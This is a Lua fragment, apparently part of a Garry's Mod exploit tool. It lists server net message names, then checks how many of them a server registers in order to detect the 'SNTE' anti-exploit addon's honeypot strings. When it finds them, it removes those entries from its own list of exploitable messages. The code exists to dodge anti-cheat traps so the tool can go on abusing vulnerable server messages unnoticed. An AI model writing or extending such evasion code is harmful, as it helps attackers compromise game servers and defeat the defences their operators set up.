  "SquadGiveWeapon",
  "BuyUpgradesStuff",
  "REPAdminChangeLVL",
  "SendMail",
  "DemotePlayer",
  "OpenGates",
  "VehicleUnderglow",
  "Hopping_Test",
  "CREATE_REPORT",
  "CreateEntity",
  "FiremanLeave",
  "DarkRP_Defib_ForceSpawn",
  "Resupply",
  "BTTTStartVotekick",
  "_nonDBVMVote",
  "REPPurchase",
  "deathrag_takeitem",
  "FacCreate",
  "InformPlayer",
  "lockpick_sound",
  "SetPlayerModel",
  "changeToPhysgun",
  "VoteBanNO",
  "VoteKickNO",
  "shopguild_buyitem",
  "MG2.Request.GangRankings",
  "RequestMAPSize",
  "gMining.sellMineral",
  "ItemStoreDrop",
  "optarrest",
  "TalkIconChat",
  "UpdateAdvBoneSettings",
  "ViralsScoreboardAdmin",
  "PowerRoundsForcePR",
  "showDisguiseHUD",
  "withdrawMoney",
  "SyncPrinterButtons76561198027292625",
  "phone",
  "STLoanToServer",
  "arcslots_monitortype",
  "TCBDealerStore",
  "TCBDealerSpawn",
  "ts_buytitle",
  "gMining.registerAchievement",
  "gPrinters.openUpgrades"
}


local Anti_Exploit_Detection = 0
local chmoshnoe = AntiSNTE
table.Add(chmoshnoe, AntiSNTE_Exploit)
for _, str in next, chmoshnoe do
    if s.ValidNetString(str) then
        Anti_Exploit_Detection = Anti_Exploit_Detection + 1
		
    end

end

local removed_net_from_snte = {}
local backdoor_removed_number = 0
if Anti_Exploit_Detection >= 15 then
    SNTEHERE = true
   for i = #s.Exploits, 1, -1 do
        if table.HasValue(AntiSNTE,s.Exploits[i][3])  then
            backdoor_removed_number = backdoor_removed_number + 1
            table.insert(removed_net_from_snte, s.Exploits[i][3])
            table.remove(s.Exploits, i)
			
		end
	end
end

print(Anti_Exploit_Detection)
PrintTable(removed_net_from_snte)

return true


